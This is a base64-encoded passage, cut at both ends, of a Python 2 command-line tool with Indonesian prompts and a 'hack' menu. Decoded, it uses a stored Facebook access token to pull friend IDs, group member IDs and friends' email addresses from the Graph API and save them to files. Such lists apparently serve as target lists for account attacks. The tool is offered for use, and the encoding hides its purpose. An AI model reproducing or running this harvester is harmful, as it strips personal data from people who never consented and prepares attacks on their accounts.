yc6CiAgICAgICAgICAgICAgICAgICAgaWRfbWVtYmVyX2dydXAoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpZiBjdWloID09ICc0JzoKICAgICAgICAgICAgICAgICAgICAgICAgZW1haWwoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGN1aWggPT0gJzUnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW1haWxmcm9tX2ZyaWVuZHMoKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY3VpaCA9PSAnNic6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9tb3JfaHAoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjdWloID09ICc3JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHBmcm9tX2ZyaWVuZHMoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGN1aWggPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gXHgxYlsxOzk3bScgKyBjdWloICsgJyBceDFiWzE7OTFtbm90IGZvdW5kJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYl9waWxpaCgpCgoKZGVmIGlkX2ZyaWVuZHMoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICBzYXZlX2lkID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1TYXZlIEZpbGUgXHgxYlsxOzk3bWV4dChmaWxlLnR4dCkgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCiAgICAgICAgICAgIGJ6ID0gb3BlbihzYXZlX2lkLCAndycpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgYWggaW4gelsnZGF0YSddOgogICAgICAgICAgICAgICAgaWRmcmllbmRzLmFwcGVuZChhaFsnaWQnXSkKICAgICAgICAgICAgICAgIGJ6LndyaXRlKGFoWydpZCddICsgJ1xuJykKICAgICAgICAgICAgICAgIHByaW50ICdcclx4MWJbMTs5Mm1OYW1lXHgxYlsxOzkxbSAgOlx4MWJbMTs5N20gJyArIGFoWyduYW1lJ10KICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtSUQgICBceDFiWzE7OTFtIDogXHgxYlsxOzk3bScgKyBhaFsnaWQnXQogICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKCiAgICAgICAgICAgIHByaW50ICdcblxyXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtVG90YWwgSUQgXHgxYlsxOzk2bSVzJyAlIGxlbihpZGZyaWVuZHMpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21GaWxlIERpc2ltcGFuIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nICsgc2F2ZV9pZAogICAgICAgICAgICBiei5jbG9zZSgpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvciB3aGVuIGNyZWF0aW5nIGZpbGUnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21LZW1iYWxpIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBvcy5yZW1vdmUoc2F2ZV9pZCkKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQW4gZXJyb3Igb2NjdXJyZWQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBObyBjb25uZWN0aW9uJwogICAgICAgICAgICBrZWx1YXIoKQoKCmRlZiBpZGZyb21fZnJpZW5kcygpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICB0cnk6CiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ2luKCkKICAgIGVsc2U6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgcHJpbnQgbG9nbwogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBpZHQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlucHV0IElEIEZyaWVuZHMgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGpvayA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICc/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIG9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXSBceDFiWzE7OTJtRnJvbVx4MWJbMTs5MW0gOlx4MWJbMTs5N20gJyArIG9wWyduYW1lJ10KICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gTm90IGJlIGZyaWVuZHMnCiAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgZ3JhYigpCgogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWR0ICsgJz9maWVsZHM9ZnJpZW5kcy5saW1pdCg1MDAwKSZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIHNhdmVfaWR0ID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1TaW1wYW4gRmlsZSBceDFiWzE7OTdtZXh0KGZpbGUudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgYnogPSBvcGVuKHNhdmVfaWR0LCAndycpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybU1vaG9uIFR1bmdndSBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgZm9yIGFoIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOgogICAgICAgICAgICAgICAgaWRmcm9tZnJpZW5kcy5hcHBlbmQoYWhbJ2lkJ10pCiAgICAgICAgICAgICAgICBiei53cml0ZShhaFsnaWQnXSArICdcbicpCiAgICAgICAgICAgICAgICBwcmludCAnXHJceDFiWzE7OTJtTmFtZVx4MWJbMTs5MW0gIDpceDFiWzE7OTdtICcgKyBhaFsnbmFtZSddCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybUlEICAgXHgxYlsxOzkxbSA6IFx4MWJbMTs5N20nICsgYWhbJ2lkJ10KICAgICAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCgogICAgICAgICAgICBwcmludCAnXG5cclx4MWJbMTs5MW1bK10gXHgxYlsxOzk3bVRvdGFsIElEIFx4MWJbMTs5Nm0lcycgJSBsZW4oaWRmcm9tZnJpZW5kcykKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzk3bUZpbGUgRGlzaW1wYW4gXHgxYlsxOzkxbTogXHgxYlsxOzk3bScgKyBzYXZlX2lkdAogICAgICAgICAgICBiei5jbG9zZSgpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvciB3aGVuIGNyZWF0aW5nIGZpbGUnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21LZW1iYWxpIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIE5vIGNvbm5lY3Rpb24nCiAgICAgICAgICAgIGtlbHVhcigpCgoKZGVmIGlkX21lbWJlcl9ncnVwKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIGlkID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JRCBncnVwIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JyArIGlkICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICAgICAgYXN3ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybU5hbWUgZ3JvdXAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBhc3dbJ25hbWUnXQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBHcm91cCBub3QgZm91bmQnCiAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgZ3JhYigpCgogICAgICAgICAgICBzaW1nID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21TaW1wYW4gRmlsZSBceDFiWzE7OTdtZXh0KGZpbGUudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgYiA9IG9wZW4oc2ltZywgJ3cnKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1Nb2hvbiBUdW5nZ3UgXHgxYlsxOzk3bS4uLicpCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIHJlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWQgKyAnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgcyA9IGpzb24ubG9hZHMocmUudGV4dCkKICAgICAgICAgICAgZm9yIGkgaW4gc1snZGF0YSddOgogICAgICAgICAgICAgICAgaWRtZW0uYXBwZW5kKGlbJ2lkJ10pCiAgICAgICAgICAgICAgICBiLndyaXRlKGlbJ2lkJ10gKyAnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzkybU5hbWVceDFiWzE7OTFtICA6XHgxYlsxOzk3bSAnICsgaVsnbmFtZSddCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybUlEICBceDFiWzE7OTFtICA6XHgxYlsxOzk3bSAnICsgaVsnaWQnXQogICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKCiAgICAgICAgICAgIHByaW50ICdcblxyXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtVG90YWwgSUQgXHgxYlsxOzk2bSVzJyAlIGxlbihpZG1lbSkKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzk3bUZpbGUgc2F2ZWQgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScgKyBzaW1nCiAgICAgICAgICAgIGIuY2xvc2UoKQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBncmFiKCkKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gRXJyb3Igd2hlbiBjcmVhdGluZyBmaWxlJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBncmFiKCkKICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LCBFT0ZFcnJvcik6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFN0b3BwZWQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgb3MucmVtb3ZlKHNpbWcpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIE5vIGNvbm5lY3Rpb24nCiAgICAgICAgICAgIGtlbHVhcigpCgoKZGVmIGVtYWlsKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIG1haWxzID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1TYXZlIEZpbGUgXHgxYlsxOzk3bWV4dChmaWxlLnR4dCkgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgYSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICBtcHNoID0gb3BlbihtYWlscywgJ3cnKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgZm9yIGkgaW4gYVsnZGF0YSddOgogICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlbJ2lkJ10gKyAnP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgZW0uYXBwZW5kKHpbJ2VtYWlsJ10pCiAgICAgICAgICAgICAgICAgICAgbXBzaC53cml0ZSh6WydlbWFpbCddICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHJceDFiWzE7OTJtTmFtZVx4MWJbMTs5MW0gIDpceDFiWzE7OTdtICcgKyB6WyduYW1lJ10KICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybUVtYWlsXHgxYlsxOzkxbSA6IFx4MWJbMTs5N20nICsgelsnZW1haWwnXQogICAgICAgICAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgcHJpbnQgJ1xuXHJceDFiWzE7OTFtWytdIFx4MWJbMTs5N21Ub3RhbCBFbWFpbFx4MWJbMTs5Nm0lcycgJSBsZW4oZW0pCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21GaWxlIHNhdmVkIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nICsgbWFpbHMKICAgICAgICAgICAgbXBzaC5jbG9zZSgpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvciB3aGVuIGNyZWF0aW5nIGZpbGUnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBvcy5yZW1vdmUobWFpbHMpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEFuIGVycm9yIG9jY3VycmVkJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBncmFiKCkKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gTm8gY29ubmVjdGlvbicKICAgICAgICAgICAga2VsdWFyKCkKCgpkZWYgZW1haWxmcm9tX2ZyaWVuZHMoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHByaW50IGxvZ28KICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgaWR0ID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JbnB1dCBJRCBGcmllbmRzIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBqb2sgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBpZHQgKyAnP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgICAgICBvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybUZyb21ceDFiWzE7OTFtIDpceDFiWzE7OTdtICcgKyBvcFsnbmFtZSddCiAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIE5vdCBiZSBmcmllbmRzJwogICAgICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgICAgIGdyYWIoKQoKICAgICAgICAgICAgbWFpbHMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVNhdmUgRmlsZSBceDFiWzE7OTdtZXh0KGZpbGUudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICcvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBhID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIG1wc2ggPSBvcGVuKG1haWxzLCAndycpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgaSBpbiBhWydkYXRhJ106CiAgICAgICAgICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaVsnaWQnXSArICc/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBlbWZyb21mcmllbmRzLmFwcGVuZCh6WydlbWFpbCddKQogICAgICAgICAgICAgICAgICAgIG1wc2gud3JpdGUoelsnZW1haWwnXSArICdcbicpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzkybU5hbWVceDFiWzE7OTFtICA6XHgxYlsxOzk3bSAnICsgelsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1FbWFpbFx4MWJbMTs5MW0gOiBceDFiWzE7OTdtJyArIHpbJ2VtYWlsJ10KICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgIHByaW50ICdcblxyXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtVG90YWwgRW1haWxceDFiWzE7OTZtJXMnICUgbGVuKGVtZnJvbWZyaWVuZHMpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21GaWxlIHNhdmVkIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nICsgbWFpbHMKICAgICAgICAgICAgbXBzaC5jbG9zZSgpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvciB3aGVuIGNyZWF0aW5nIGZpbGUnCiAgICAgICAgICAgI